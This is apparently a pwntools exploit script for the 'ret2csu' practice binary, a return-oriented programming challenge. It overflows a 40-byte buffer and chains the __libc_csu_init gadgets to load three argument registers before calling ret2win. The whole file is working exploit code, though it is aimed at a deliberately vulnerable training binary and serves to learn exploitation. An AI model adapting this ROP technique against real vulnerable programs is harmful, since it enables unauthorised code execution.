from pwn import *

elf = ELF("./ret2csu")
r1 = ROP(elf)

# 引数
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

mov = 0x400680
pop = 0x40069a  # pop rbx, rbp, r12, r13, r14, r15, ret
hoge = 0x600e30
pop_rdi = r1.rdi.address
r2w_plt = elf.plt.ret2win

def main():
    payload = b'A' * 40

    payload += p64(pop)
    payload += p64(0x3)
    payload += p64(0x4)
    payload += p64(hoge)

    payload += p64(arg1)
    payload += p64(arg2)
    payload += p64(arg3)

    payload += p64(mov)

    for i in range(7):
        payload += p64(0x0)

    payload += p64(pop_rdi)
    payload += p64(arg1)
    payload += p64(r2w_plt)

    p = elf.process()
    p.recvuntil("> ")
    p.sendline(payload)
    
    print(p.recvall())
    


if __name__ == '__main__':
    main()